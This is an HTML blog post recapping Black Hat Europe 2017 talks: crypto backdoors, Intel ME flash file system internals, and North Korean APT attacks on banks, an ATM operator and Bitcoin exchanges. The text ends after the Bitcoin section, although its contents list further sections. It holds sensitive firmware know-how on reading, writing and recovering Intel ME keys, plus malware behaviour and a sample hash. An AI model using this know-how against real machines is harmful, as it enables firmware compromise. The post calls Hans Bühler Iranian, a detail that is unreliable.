@@ -1,0 +1,1505 @@
+<!DOCTYPE html>
+<html lang="">
+	
+	
+
+
+	<head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta http-equiv="Cache-Control" content="public" />
+	<!-- Enable responsiveness on mobile devices -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	
+	    
+	    
+	    
+	
+	<title>Black Hat Europe 2017 • Just another infosec blog</title>
+	
+	
+	<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Black Hat Europe 2017"/>
+<meta name="twitter:description" content="Feedback on Black Hat Europe 2017 conference."/>
+
+	<meta property="og:title" content="Black Hat Europe 2017" />
+<meta property="og:description" content="Feedback on Black Hat Europe 2017 conference." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://maki.bzh/articles/feedback_blackhat2017/" />
+<meta property="article:published_time" content="2018-10-03T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2018-10-03T00:00:00&#43;00:00"/>
+
+
+    		
+	
+	
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css" integrity="sha256-90Y+fvi28WF+3jKH4tHEkoQ9WLeFKJjpvCPNOtU9ZvU= sha384-s+7l2WBKs5ChgZ+esoTV0aWZRcma7BxuSHlzBJz6PH4Cc4ZX3/ErQZtk+ZzYQy/X sha512-BiC3DH0qMCjCYqPNGAthQ95QCndm60uhfQVwhqZ2eG1zuGkP+3T1cw6PzEC4CiRfRIbd2qvyN39RoDfil/XcMA==" crossorigin="anonymous">
+	
+	
+	
+
+	<link rel="stylesheet" href="/css/hyde-hyde.css" integrity="sha256-cUUT8nKBmejGAmxYnpOnspTmwap5Sjc/nzRfeTTjgeQ=" crossorigin="anonymous">
+	<link rel="stylesheet" href="/css/custom.css" >
+	<link rel="stylesheet" href="/css/print.min.css" media="print" integrity="sha256-obkLPMZU5Kb+rPwjMazkJLfYW8H9dj6yh8Gzzs2dv5c=" crossorigin="anonymous">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g= sha384-qFIkRsVO/J5orlMvxK1sgAt2FXT67og+NyFTITYzvbIP1IJavVEKZM7YWczXkwpB sha512-UDJtJXfzfsiPPgnI5S1000FPLBHMhvzAMX15I+qG2E2OAzC9P1JzUwJOfnypXiOH7MRPaqzhPbBGDNNj7zBfoA==" crossorigin="anonymous"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE= sha384-ZoaMbDF+4LeFxg6WdScQ9nnR1QC2MIRxA1O9KWEXQwns1G8UNyIEZIQidzb0T1fo sha512-qWVvreMuH9i0DrugcOtifxdtZVBBL0X75r9YweXsdCHtXUidlctw7NXg5KVP3ITPtqZ2S575A0wFkvgS2anqSA==" crossorigin="anonymous"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="shortcut icon" href="/favicon.png">
+    	
+
+</head>
+
+
+	<body >
+				
+		<div class="sidebar">
+			<div class="container sidebar-about ">
+				<span class="site__title">
+				
+					<a href=""></a>
+				</span>
+				<a href="https://maki.bzh/">
+					
+					
+					
+					<div class="author-image">
+						<img src="https://maki.bzh/img/maki.jpg" alt="Author Image" class="img--circle img--headshot element--center"/>
+					</div>
+					
+				</a>
+				<p class="site__description">
+					<a href="https://maki.bzh/en">
+						
+					</a>
+				</p>
+				<div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/walkthrough/">
+						<span>Walkthrough</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/stupidthings/">
+						<span>Stupid Things</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/ctf/">
+						<span>CTF</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/friends/">
+						<span>Friends</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/whoami/">
+						<span>Who Am I?</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+				
+				<section class="social">
+						
+						<a href="https://twitter.com/maki_mitz" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						<a href="https://gitlab.com/maki_chaz" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						<a href="mailto:Yml0ZWRlcG91bGV0" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+						
+						
+					  &nbsp;<a href="https://www.root-me.org/Maki-37744" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.hackthebox.eu/home/users/profile/10265" target="blank" class="linklogo"><div class="rotate hackthebox_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+					  
+</section>
+
+				
+				
+				<p class="copyright">
+					&copy; 2020 Maki.
+					<br/>
+					<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+					<br/>Built with, Haax, Laluka, _ACKNAK_
+					<a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+					
+				</p>
+			</div>
+		</div>
+
+		<div class="content container">
+			
+	<article>
+	<header>
+		<h1>Black Hat Europe 2017</h1>
+		
+		
+<div class="post__meta">
+	
+	<i class="fas fa-calendar-alt"></i> Oct 3, 2018
+	
+	
+	<br/>
+	<i class="fas fa-clock"></i> 26 min read
+</div>
+
+
+	</header>
+	<hr/>
+	<div class="post">
+		<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#day-1">Day 1</a>
+<ul>
+<li><a href="#diplomacy-and-combating-evolving-international-cyber-threats">Diplomacy and Combating Evolving International Cyber Threats</a>
+<ul>
+<li><a href="#sources-document">Sources document</a></li>
+</ul></li>
+<li><a href="#by-design-backdooring-of-encryption-system-can-we-trust-foreign-encryption-algorithms">By-design Backdooring of Encryption System - Can we trust Foreign Encryption Algorithms</a>
+<ul>
+<li><a href="#sources-documents">Sources documents</a></li>
+</ul></li>
+<li><a href="#intel-me-flash-file-system-explained">Intel ME: Flash File System Explained</a>
+<ul>
+<li><a href="#sources-documents-1">Sources documents</a></li>
+</ul></li>
+<li><a href="#nation-state-moneymule-s-hunting-season-apt-attacks-targeting-financial-institutions">Nation-State Moneymule’s Hunting Season - APT Attacks Targeting Financial Institutions</a></li>
+<li><a href="#korea-major-bank-attack-by-bluenoroff">Korea Major Bank Attack By Bluenoroff</a></li>
+<li><a href="#atm-operator-company-break-aka-vanxatm">ATM Operator Company Break aka VANXATM</a></li>
+<li><a href="#bitcoin-exchanges-hacked">Bitcoin Exchanges Hacked</a>
+<ul>
+<li><a href="#sources-documents-2">Sources documents</a></li>
+</ul></li>
+<li><a href="#how-to-hack-a-turned-off-computer-or-running-unsigned-code-in-intel-management-engine">How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine</a>
+<ul>
+<li><a href="#sources-documents-3">Sources documents</a></li>
+</ul></li>
+<li><a href="#goodies-hunting-part-1">Goodies hunting part 1</a></li>
+</ul></li>
+<li><a href="#day-2">Day 2</a>
+<ul>
+<li><a href="#red-team-techniques-for-evading-bypassing-and-disabling-ms-advanced-threat-protection-and-advanced-threat-analytics">Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics</a>
+<ul>
+<li><a href="#source-documents">Source documents</a></li>
+</ul></li>
+<li><a href="#breaking-out-hsts-and-hpkp-on-firefox-ie-edge-and-possibly-chrome">Breaking Out HSTS (and HPKP) on Firefox, IE/Edge and (Possibly) Chrome</a>
+<ul>
+<li><a href="#firefox">Firefox</a></li>
+<li><a href="#chrome">Chrome</a></li>
+<li><a href="#internet-explorer-edge">Internet Explorer/EDGE</a></li>
+<li><a href="#source-documents-1">Source documents</a></li>
+</ul></li>
+<li><a href="#key-reinstallation-attacks-breaking-the-wpa2-protocol">Key Reinstallation Attacks: Breaking the WPA2 Protocol</a>
+<ul>
+<li><a href="#source-documents-2">Source documents</a></li>
+</ul></li>
+<li><a href="#a-universal-controller-to-take-over-a-z-wave-network">A Universal Controller to Take Over a Z-Wave Network</a>
+<ul>
+<li><a href="#source-documents-3">Source documents</a></li>
+</ul></li>
+<li><a href="#goodies-hunting-part-2">Goodies hunting part 2</a></li>
+</ul></li>
+<li><a href="#others-briefing">Others briefing</a></li>
+<li><a href="#arsenal">Arsenal</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul></li>
+</ul>
+</nav>
+		
+
+<h2 id="introduction">Introduction</h2>
+
+<p>First of all, thanks, Black Hat to win places for a student! I filled the annual survey and that happens, it’s crazy! Then, me and 3 my friends (see below) went to London!</p>
+
+<ul>
+<li><a href="https://twitter.com/GregoireMolveau">@GregoireMolveau</a></li>
+<li><a href="https://twitter.com/razaborg">@razaborg</a></li>
+<li><a href="https://twitter.com/L4rg0_W1nch">@L4rg0_W1nch</a></li>
+</ul>
+
+<p>All briefing was interesting, but the most impressive one was on Intel ME from <strong>Mark Ermolov</strong>, <strong>Maxim Goryachy</strong> and <strong>Dimitry SKLYAROV</strong></p>
+
+<p>I’ll present this article by day and briefing. At the end of each briefing, I’ll add a personal point of view. So, let’s start! :)</p>
+
+<h2 id="day-1">Day 1</h2>
+
+<h3 id="diplomacy-and-combating-evolving-international-cyber-threats">Diplomacy and Combating Evolving International Cyber Threats</h3>
+
+<hr />
+
+<blockquote>
+<p>Chris Painter - State department’s top cyber diplomat</p>
+</blockquote>
+
+<p><em>Chris Painter</em> talked about the history of the cyber in his country, and his own history. The presentation highlights something interesting, according to <em>Chris Painter</em>, <strong>policy threats</strong> are more often dangerous than <strong>technical threats</strong>.</p>
+
+<p>The world is more and more connected, and everything is connected to the Internet. It’s the main reason why <strong>Wannacry</strong> and <strong>NotPetya</strong> did so much damage in UK (and obviously in other countries). Also, it’s very difficult, even impossible, to assign an attack to a group or state/government. At last, a government does not disclose all information about an attack.</p>
+
+<p><em>Chris Painter</em> told about worldwide cyber norms during peacetime (1) and wartime to harmonize instructions. Laws processes are too slow, so if you don’t respect norms, there are no sanctions yet…</p>
+
+<p>Another sensitive point is terrorism. <em>Chris Painter</em> said that we have to monitor people to monitor terrorism because they use the internet to communicate with each other, not attacks.</p>
+
+<p>Finally, it’s hard to ask a physical and/or military response to a cyber attack if there is not at least one death.</p>
+
+<p><strong>From a personal point of view</strong>, it was interesting to see how the UK manages cyber attacks and what is planned for the future.</p>
+
+<h4 id="sources-document">Sources document</h4>
+
+<ol>
+<li>Fergus Hanson, <em>Norms of Cyber War in Peacetime</em>, Sunday, November 15, 2015. <a href="https://www.lawfareblog.com/norms-cyber-war-peacetime">https://www.lawfareblog.com/norms-cyber-war-peacetime</a></li>
+<li>Mei Gechlik, <em>Appropriate Norms of State Behavior in Cyberspace: Governance in China and Opportunities for US Businesses</em>, Aegis Series Paper No. 1706. <a href="https://www.hoover.org/sites/default/files/research/docs/gechlik_webreadypdf.pdf">https://www.hoover.org/sites/default/files/research/docs/gechlik_webreadypdf.pdf</a></li>
+<li>Wikipedia, <em>Colossus computer</em>. <a href="https://en.wikipedia.org/wiki/Colossus_computer">https://en.wikipedia.org/wiki/Colossus_computer</a></li>
+</ol>
+
+<h3 id="by-design-backdooring-of-encryption-system-can-we-trust-foreign-encryption-algorithms">By-design Backdooring of Encryption System - Can we trust Foreign Encryption Algorithms</h3>
+
+<hr />
+
+<blockquote>
+<p>Arnaud BANNIER &amp; Eric FILIOL (speaker) from ESIEA</p>
+</blockquote>
+
+<p>Few countries (French, Germany, thee UK and so on) are asking for encryption backdoor law (<sup>2</sup>&frasl;<sub>3</sub>) in IoT. Since World War 2, there is a government (G-20 countries now) control on cryptography.</p>
+
+<p><em>Eric FILIOL</em> says that there are differences between <strong>trapdoor</strong> and <strong>backdoor</strong>.</p>
+
+<ul>
+<li><strong>Trapdoor</strong>: Feature of asymmetrical encryption.</li>
+<li><strong>Backdoor</strong>: Unwanted feature for attacker benefits.</li>
+</ul>
+
+<p>In mathematical backdoors, there is two type of weaknesses.</p>
+
+<ul>
+<li><strong>Natural</strong>: For example, elliptic curves with specific points.</li>
+<li><strong>Intended</strong>: Intentional misconception.</li>
+</ul>
+
+<p>Now, the question is: Can we trust cryptographic algorithms from a third-party country?</p>
+
+<p>There are not many choices in cryptography, for public symmetrical and secure algorithms, we have only AES at this time.</p>
+
+<p><em>Eric FILIOL</em> advises us to read <strong>Verschlüsselt, Der Fall Hans Bühler</strong>. This book talks about an Iranian guy that proves cryptographic algorithms were backdoored. At this time, algorithms were not public, this man was arrested in 1992.</p>
+
+<p>The NSA did a new cryptographic algorithm for IoT, but after pressure, from experts and corporate, ISO rejected the standard.</p>
+
+<p>The researcher <em>Eric FILIOL</em> talked about the BEA-1 algorithm and how is it possible to inject a mathematical backdoor.</p>
+
+<p>His presentation (1) present all the process, I let you check it :)</p>
+
+<p><strong>From a personal point of view</strong>, this presentation was a good introduction to backdoors in encryption algorithms. But, honestly, I didn’t understand everything :-)</p>
+
+<h4 id="sources-documents">Sources documents</h4>
+
+<ol>
+<li>Arnaud BANNIER &amp; Eric FILIOL, <em>Black Hat presentation</em>, Wednesday, December 6, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Filiol-By-Design-Backdooring-Of-Encryption-System-Can-We-Trust-Foreign-Encryption-Algorithms.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Filiol-By-Design-Backdooring-Of-Encryption-System-Can-We-Trust-Foreign-Encryption-Algorithms.pdf</a></li>
+<li>Kieren MCCARTHY, <em>French, German ministers demand new encryption backdoor law</em>, August 26, 2016. <a href="https://www.theregister.co.uk/2016/08/24/french_german_ministers_call_for_new_encryption_backdoor_law/">https://www.theregister.co.uk/2016/08/24/french_german_ministers_call_for_new_encryption_backdoor_law/</a></li>
+<li>James VINCENT, <em>UK government renews calls for WhatsApp backdoor after London attack</em>, March 27, 2017. <a href="https://www.theverge.com/2017/3/27/15070744/encryption-whatsapp-backdoor-uk-london-attacks">https://www.theverge.com/2017/3/27/15070744/encryption-whatsapp-backdoor-uk-london-attacks</a></li>
+<li>Cryptographic laws in different countries. <a href="http://www.cryptolaw.org/">http://www.cryptolaw.org/</a></li>
+</ol>
+
+<h3 id="intel-me-flash-file-system-explained">Intel ME: Flash File System Explained</h3>
+
+<hr />
+
+<blockquote>
+<p>Dimitry SKLYAROV - Positive Technologies</p>
+</blockquote>
+
+<p><em>Dimitry SKLYAROV</em> starts his presentation by introducing the Intel Management Engine and the hierarchy in a computer.</p>
+
+<p>Hierarchy of a computer:</p>
+
+<ol>
+<li>User</li>
+<li>OS Kernel</li>
+<li>Hypervisor</li>
+<li>System Management Mode (SMM)</li>
+<li>Management Engine (ME)</li>
+</ol>
+
+<p>Top layer (user) has limited permission on the under layer (OS Kernel) and this mecanism works until the fifth layer. On the other hand, the under layer has full access on the top one.
+Then, from 1 to 5 -&gt; limited access and from 5 to 1 -&gt; Full access.
+To conclude, Intel ME got full access to the machine.</p>
+
+<p>I let you imagine what happens if malware goes into the ME. The ME is a standalone electronic chip before the CPU, it interacts with all other components.</p>
+
+<p><em>Dimitry SKLYAROV</em> says that before trying to flash the Intel ME, you have to erase it completely. But, there is a limited number of cycles (between 10 000 and 1 000 000). After this limit, the ME is unusable.</p>
+
+<p>Intel made design the flash with incremental modification to avoid redundantly erases and distribute erases between block as evenly as possible to preserve the ME.</p>
+
+<p>After the introduction, <em>Dimitry SKLYAROV</em> talked about <strong>MFS pagination</strong>. Inside the ME, all MFS page has the same size (8192 bytes), starts with the same header (0xAA557887) and there is always an empty page.</p>
+
+<table>
+<thead>
+<tr>
+<th>Signature</th>
+<th>USN</th>
+<th>nErase</th>
+<th>iNextErase</th>
+<th>firstChunk</th>
+<th>csum</th>
+<th>0x00</th>
+</tr>
+</thead>
+
+<tbody>
+</tbody>
+</table>
+
+<ul>
+<li>Signature: Always 0xAA557887</li>
+<li>USN: Update Sequence Number</li>
+<li>nErase: How many times page has been erased</li>
+<li>iNextErase: Index of next to be erased page</li>
+<li>firstChunk: Index of first chunk (for Data page)</li>
+<li>csum: Checksum</li>
+</ul>
+
+<p>Each page contains 66 bytes chunks, it’s an addressable and modifiable unit in the page of the MFS. Those chunks contain 2 bytes of checksum at the end (CRC-16).</p>
+
+<p><em>Dimitry SKLYAROV</em> mentions that reversing CRC-16 allows easy calculation of the chunk index. By the way, <em>indexing</em> is the reason why checksum is different for the same data.</p>
+
+<p>Just after the header chunk, there is the <strong>system chunk</strong>. As the <em>Dimitry SKLYAROV</em> picture shows below, this chunk is composed of:</p>
+
+<ul>
+<li>Chunk# 0x1201: Chunk full of zero</li>
+<li>Chunk# 0x1202: Two first bytes at <code>F4 D4</code> followed by a complete chunk full of zero</li>
+<li>Chunk# 0x1203: Two first bytes at <code>A7 B1</code> followed by a complete chunk full of zero</li>
+<li>Chunk# 0x1204: Two first bytes at <code>96 B2</code> followed by a complete chunk full of zero</li>
+<li>&hellip;</li>
+</ul>
+
+<p><strong>axIdx</strong> is a 16 bits array, entries of this array are the number of chunks + 1 and it is dynamically XORed. The key value depends on the previous value from <strong>axIdx</strong>. You can recover it by reversing CRC-16 function (in fact, it’s a modified algorithm stripped to 14 bits).</p>
+
+<p>Data pages are easier to understand. After the header page, there is the <strong>aFree</strong> bit. This bit tells if the data chunk contains something or not (<strong>aFree[i] == 0xFF</strong>).</p>
+
+<p>Each Data chunk is stored once with a sequential number started from the first chunk.</p>
+
+<p>System chunks are stored accords to the update order, not sequentially. Then, an index from System page is derived from <strong>axIdx</strong> value.</p>
+
+<p>Now, to extract data, <em>Dimitry SKLYAROV</em> explains that you have to follow this diagram:</p>
+
+<table>
+<thead>
+<tr>
+<th>Diagram</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>int32 - Volume Signature (0x724F6201)</td>
+</tr>
+
+<tr>
+<td>int32 - Volume Version ?</td>
+</tr>
+
+<tr>
+<td>int32 - Total capacity: System area + Data area</td>
+</tr>
+
+<tr>
+<td>int16 - Number of files records</td>
+</tr>
+
+<tr>
+<td>int16 - File allocation table</td>
+</tr>
+</tbody>
+</table>
+
+<p>Low-Level MFS does not support file names. Files are identified by numbers (from 0 to nFiles-1). Let <em>Dimitry SKLYAROV</em> explains his diagram:</p>
+
+<ol>
+<li>Calculate the index in File Allocation Table: <strong>ind = aFAT[iFile]</strong>. Values 0x0000 for unused and 0xFFFE for erased means that file does not exist and values 0xFFFF means empty file.</li>
+<li><strong>ind</strong> must be between <strong>nFiles</strong> and aFAT length.</li>
+<li>Extract chunk data</li>
+<li>Calculate the next index</li>
+<li>If the new value is between 0 and chunk size MFS, then output first <strong>ind</strong> bytes of data and goes to the end of the process.</li>
+<li>Output all 64 bytes of data and processes to step 2.</li>
+</ol>
+
+<p>After that, <em>Dimitry SKLYAROV</em> did an MFS template from <strong>fit.exe</strong>.</p>
+
+<p>Then MFS is composed of:</p>
+
+<p><img src="/img/bheu2017/me4.png" alt="" /></p>
+
+<p><em>Dimitry SKLYAROV</em> attentions was on <em>Slot 6</em>, containing the <strong>intel.cfg</strong> file. This file is necessary for ME deployment at the first run. Here is the structure:</p>
+
+<table>
+<thead>
+<tr>
+<th>File #</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>2,3</td>
+<td>AR (Anti-Replay) table</td>
+</tr>
+
+<tr>
+<td>4</td>
+<td>Used for migration after SVN (Secure Version Number) upgrade</td>
+</tr>
+
+<tr>
+<td>5</td>
+<td>File System Quota storage (related to User info metadata extension for <code>vfs</code> module</td>
+</tr>
+
+<tr>
+<td>6</td>
+<td><code>/intel.cfg</code> file (default state of FS configured by Intel). SHA256 of <code>intel.cfg</code> is stored in System Info manifest extension</td>
+</tr>
+
+<tr>
+<td>7</td>
+<td><code>fitc.cfg</code> file (vendor-specific FS configuration). Can be created by platform vendor using Intel&rsquo;s Flash Image Tool (fit.exe)</td>
+</tr>
+
+<tr>
+<td>8</td>
+<td><code>/home/</code> directory (starting directory for ME files stored in MFS)</td>
+</tr>
+</tbody>
+</table>
+
+<p>Below a partial dump of the <strong>intel.cfg</strong>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Diagram</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>int32 - Number of records</td>
+</tr>
+
+<tr>
+<td>File Name (char name[12])</td>
+</tr>
+
+<tr>
+<td>int16 - unused, always 0</td>
+</tr>
+
+<tr>
+<td>int16 - Access mode</td>
+</tr>
+
+<tr>
+<td>int16 - Deploy options</td>
+</tr>
+
+<tr>
+<td>int16 - File data length</td>
+</tr>
+
+<tr>
+<td>int16 - Owned user ID (UID)</td>
+</tr>
+
+<tr>
+<td>int16 - Owner group ID (GID)</td>
+</tr>
+
+<tr>
+<td>int32 - File data offset</td>
+</tr>
+
+<tr>
+<td>int8 - File data</td>
+</tr>
+</tbody>
+</table>
+
+<p>Letters in <strong>mode</strong> and <strong>opt</strong> field means:</p>
+
+<p><img src="/img/bheu2017/mode_and_opt_field_means.png" alt="" /></p>
+
+<p>An MFS directory is just an array of records describing containing files. MFS file #8 always represents the <strong>/home/</strong> directory. Here is the structure:</p>
+
+<table>
+<thead>
+<tr>
+<th>Struct - T_MFS_Folder_Record</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>int32 - filenoi (FS, salt, iFile)</td>
+</tr>
+
+<tr>
+<td>int16 - mode (Access mode)</td>
+</tr>
+
+<tr>
+<td>int16 - uid (Owner User ID)</td>
+</tr>
+
+<tr>
+<td>int16 - gid (Group User ID)</td>
+</tr>
+
+<tr>
+<td>int16 - salt (Another salt)</td>
+</tr>
+
+<tr>
+<td>name[12] - File name</td>
+</tr>
+</tbody>
+</table>
+
+<p>And a dump of the password manager located in the <strong>home/policy/pwdmgr/</strong> directory:</p>
+
+<p><img src="/img/bheu2017/homepolicypwdmgr.png" alt="" /></p>
+
+<p>Meaning of <strong>fileno</strong>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Bits</th>
+<th>Description of <code>fileno</code> fields</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>11..0</td>
+<td>iFile (0..4095)</td>
+</tr>
+
+<tr>
+<td>27..12</td>
+<td>16 bits of salt</td>
+</tr>
+
+<tr>
+<td>31..28</td>
+<td>FileSystem ID (always 1)</td>
+</tr>
+</tbody>
+</table>
+
+<p>and <strong>mode</strong>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Bits</th>
+<th>Description of <code>mode</code> fields</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>8..0</td>
+<td><code>rwxrwxrwx</code> Unix-like rights</td>
+</tr>
+
+<tr>
+<td>9</td>
+<td><code>I</code> Enable integrity protection</td>
+</tr>
+
+<tr>
+<td>10</td>
+<td><code>E</code> Enable encryption</td>
+</tr>
+
+<tr>
+<td>11</td>
+<td><code>A</code> Enable anti-replay protection</td>
+</tr>
+
+<tr>
+<td>13</td>
+<td><code>N</code> Use non-Intel keys</td>
+</tr>
+
+<tr>
+<td>15..14</td>
+<td><code>d</code> Record type (0: file, 1: directory)</td>
+</tr>
+</tbody>
+</table>
+
+<p>If bit 9 (for <em>integrity</em>) is set in the <strong>mode</strong> field, raw file contains additional security blob. It is added to the <strong>Anti-replay</strong> tables (iFile == 2,3) and <strong>/home/</strong> directory (iFile == 8).</p>
+
+<p>The final part of the <em>Dimitry SKLYAROV</em> presentation was about <strong>File system security keys</strong>. There are up to 10 security keys involved in protecting the MFS content.</p>
+
+<p>Replay-Protected Monotonic Counter is a feature of the SPI flash. If this feature is unavailable, then the ME implements its own counter. There are two keys to handle RPMC, <strong>RPMC HMAC keys</strong>.</p>
+
+<p>Two more keys are used to protect Integrity and Confidentiality. Moreover, there are two sets of keys: <strong>Intel keys</strong> and <strong>Non-intel keys</strong> (motherboard manufacturer keys).</p>
+
+<p>Surprisingly enough, Intel keys are used in rare modules (sigma, ptt, dal_ivm, mca).</p>
+
+<p>It’s possible to derive keys, and Secure Key Storage is allowed for ROM, bup and crypto modules.</p>
+
+<p>Knowing <strong>GEN</strong> secret for non-intel keys (via JTAG) allows to read/write on the MFS. If we can execute code into <strong>bup</strong> module, then it is possible to recover intel keys.</p>
+
+<p><strong>From a personal point of view</strong>, I loved this presentation! I’m very interested in Intel ME and how it works. After the briefing, a lot of things were much clearer to me.</p>
+
+<h4 id="sources-documents-1">Sources documents</h4>
+
+<ol>
+<li>Dimitry SKLYAROV, <em>Flash File System Explained</em>, Wednesday, December 6, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained-wp.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained-wp.pdf</a></li>
+<li>Dimitry SKLYAROV, <em>Black Hat Presentation</em>, Wednesday, December 6, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained.pdf</a></li>
+<li>Intel Reference Guide, <em>Intel AMT Release 2.0/2.<sup>1</sup>&frasl;<sub>2</sub>.2 Architecture</em>. <a href="https://software.intel.com/sites/manageability/AMT_Implementation_and_Reference_Guide/default.htm?turl=WordDocuments/intelamtrelease202122architecture.htm">https://software.intel.com/sites/manageability/AMT_Implementation_and_Reference_Guide/default.htm?turl=WordDocuments/intelamtrelease202122architecture.htm</a></li>
+<li>Xiaoyu Ruan, <em>Platform Embedded Security Technology Revealed</em>. <a href="https://link.springer.com/content/pdf/10.1007%2F978-1-4302-6572-6.pdf">https://link.springer.com/content/pdf/10.1007%2F978-1-4302-6572-6.pdf</a></li>
+<li>Igor Skochinsky, <em>Intel ME Secrets</em>. <a href="https://recon.cx/2014/slides/Recon%202014%20Skochinsky.pdf">https://recon.cx/2014/slides/Recon%202014%20Skochinsky.pdf</a></li>
+<li>Positive Technologies, <em>Intel ME: The Way of the Static Analysis</em>. <a href="https://www.troopers.de/downloads/troopers17/TR17_ME11_Static.pdf">https://www.troopers.de/downloads/troopers17/TR17_ME11_Static.pdf</a></li>
+<li>Positive Technologies, <em>[Github] Intel ME 11.x Firmware Images Unpacker</em>. <a href="https://github.com/ptresearch/unME11">https://github.com/ptresearch/unME11</a></li>
+</ol>
+
+<h3 id="nation-state-moneymule-s-hunting-season-apt-attacks-targeting-financial-institutions">Nation-State Moneymule’s Hunting Season - APT Attacks Targeting Financial Institutions</h3>
+
+<hr />
+
+<blockquote>
+<p>Min-Chang Jang (speaker), Chi-en Shen (speaker) &amp; Kyoung-Ju Kwak from KFSI &amp; Team T5</p>
+</blockquote>
+
+<p>They started to introduce different groups and made a timeline of different attacks:</p>
+
+<p><img src="/img/bheu2017/apt1.png" alt="" /></p>
+
+<p><img src="/img/bheu2017/apt2.png" alt="" /></p>
+
+<h3 id="korea-major-bank-attack-by-bluenoroff">Korea Major Bank Attack By Bluenoroff</h3>
+
+<p>In March 2017, the Korea major bank has been attacked. Targets were employees in charge of the SWIFT system. <strong>Bluenoroff</strong> found a 0day in a file sharing function in VDI Program (4).</p>
+
+<p><em>No severe damage and only 2 PC infected</em></p>
+
+<p><img src="/img/bheu2017/apt3.png" alt="" /></p>
+
+<p>Malware used is in <strong>Manuscrypt</strong> family.</p>
+
+<ul>
+<li>Research for SWIFT network.</li>
+<li>Activate NamedPipe of a specific process.</li>
+<li>Look for desired data and send them to C&amp;C server.</li>
+</ul>
+
+<p>IP was hidden in a plain registry key. Data sent to the C2 were encoded.</p>
+
+<p>And here is how analyst were able to decode the data:</p>
+
+<p><img src="/img/bheu2017/apt4.png" alt="" /></p>
+
+<h3 id="atm-operator-company-break-aka-vanxatm">ATM Operator Company Break aka VANXATM</h3>
+
+<p>The operation started from Feb 2015 and leakage in March 2017. The target is ATM Operator Company (manage more than 2000 ATM).</p>
+
+<p>Andareil group used a 0day in AV and misconfiguration/mismanagement between ATM machines and ATM update server.</p>
+
+<p>230 000 credit card information leaked.</p>
+
+<p><img src="/img/bheu2017/apt5.png" alt="" /></p>
+
+<p>Malware <strong>fs.exe</strong>:</p>
+
+<ul>
+<li>Scan AV server’s service port</li>
+<li>Connect to server</li>
+<li>Send file</li>
+<li>Run file</li>
+<li>Look for Transaction date/time, account number issuers, request amount and balance.</li>
+</ul>
+
+<p>For the VANXATM case, Andariel group targeted only 64 ATM, because they have plain credit card information on a FTP.</p>
+
+<h3 id="bitcoin-exchanges-hacked">Bitcoin Exchanges Hacked</h3>
+
+<p>Four Bitcoin exchanges were attacked. Attacker impersonates the public institutes for phishing and they used nine email accounts for attack (4 out 9 were stolen).</p>
+
+<p>Mobile malware to bypass SMS authentication.</p>
+
+<p>Sample hash: 22a279c5685d7c3e24c04580204a8a932b2909a77a549bdd7bcf7ead285efde9</p>
+
+<p>They used Ghostscript vulnerability (kind of macro attack).</p>
